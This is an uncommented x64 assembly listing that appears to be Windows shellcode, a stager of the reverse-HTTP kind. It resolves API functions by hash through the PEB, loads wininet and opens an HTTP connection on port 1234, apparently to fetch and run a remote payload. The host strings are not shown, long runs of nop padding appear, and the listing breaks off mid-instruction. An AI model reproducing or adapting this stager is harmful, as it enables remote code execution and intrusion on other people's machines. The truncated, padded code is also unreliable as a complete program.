```asm
_start:
cld
and rsp, 0xfffffffffffffff0
call L_d6
RET_a:
push r9
push r8
push rdx
push rcx
push rsi
xor rdx, rdx
mov rdx, qword ptr gs:[rdx + 0x60]
mov rdx, qword ptr [rdx + 0x18]
mov rdx, qword ptr [rdx + 0x20]
jmp L_21
L_21:
xor r9, r9
mov rsi, qword ptr [rdx + 0x50]
movzx rcx, word ptr [rdx + 0x4a]
jmp L_2d
L_2d:
xor rax, rax
lodsb al, byte ptr [rsi]
cmp al, 0x61
jl L_37
jmp L_37_fall
L_37_fall:
sub al, 0x20
jmp L_37
L_37:
ror r9d, 0xd
add r9d, eax
loop L_2d
jmp L_37_after_loop
L_37_after_loop:
push rdx
push r9
mov rdx, qword ptr [rdx + 0x20]
mov eax, dword ptr [rdx + 0x3c]
add rax, rdx
cmp word ptr [rax + 0x18], 0x20b
jne L_cb
jmp L_37_ok
L_37_ok:
mov eax, dword ptr [rax + 0x88]
test rax, rax
je L_cb
jmp L_37_ok2
L_37_ok2:
add rax, rdx
push rax
mov ecx, dword ptr [rax + 0x18]
mov r8d, dword ptr [rax + 0x20]
add r8, rdx
jmp L_72
L_72:
jrcxz L_ca
jmp L_72_fall
L_72_fall:
xor r9, r9
dec rcx
mov esi, dword ptr [r8 + rcx*4]
add rsi, rdx
jmp L_81
L_81:
xor rax, rax
ror r9d, 0xd
lodsb al, byte ptr [rsi]
add r9d, eax
cmp al, ah
jne L_81
jmp L_81_fall
L_81_fall:
add r9, qword ptr [rsp + 8]
cmp r9d, r10d
jne L_72
jmp L_81_success
L_81_success:
pop rax
mov r8d, dword ptr [rax + 0x24]
add r8, rdx
mov cx, word ptr [r8 + rcx*2]
mov r8d, dword ptr [rax + 0x1c]
add r8, rdx
mov eax, dword ptr [r8 + rcx*4]
pop r8
pop r8
pop rsi
pop rcx
add rax, rdx
pop rdx
pop r8
pop r9
pop r10
sub rsp, 0x20
push r10
jmp rax
L_ca:
pop rax
jmp L_cb
L_cb:
pop r9
pop rdx
mov rdx, qword ptr [rdx]
jmp L_21
L_d6:
pop rbp
xor rbx, rbx
push rbx
movabs r14, 0x74656e696e6977
push r14
mov rcx, rsp
mov r10, 0x726774c
call rbp
push rbx
push rbx
lea rcx, [rip + DATA_0]
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push rbx
pop rdx
xor r8, r8
xor r9, r9
push rbx
push rbx
movabs r10, 0xa779563a
call rbp
lea rdx, [rip + DATA_1]
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov rcx, rax
mov r8, 0x4d2
xor r9, r9
push rbx
push rbx
push 3
push rbx
movabs r10, 0xc69f8957
call rbp
jmp DATA_STUB_2
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
jmp L_1de
L_205:
mov rcx, rsi
push 0x1f
pop rdx
push rdx
push 0x3380
mov r8, rsp
push 4
pop r9
movabs r10, 0x869e4675
call rbp
xor r8, r8
push rbx
pop rdx
mov rcx, rsi
xor r9, r9
xor r9, r9
push rbx
push rbx
mov r10, 0x7b18062d
call rbp
test eax, eax
jne L_260
jmp L_205_fall
L_1de:
mov rcx, rax
push rbx
pop rdx
pop r8
xor r9, r9
push rbx
movabs rax,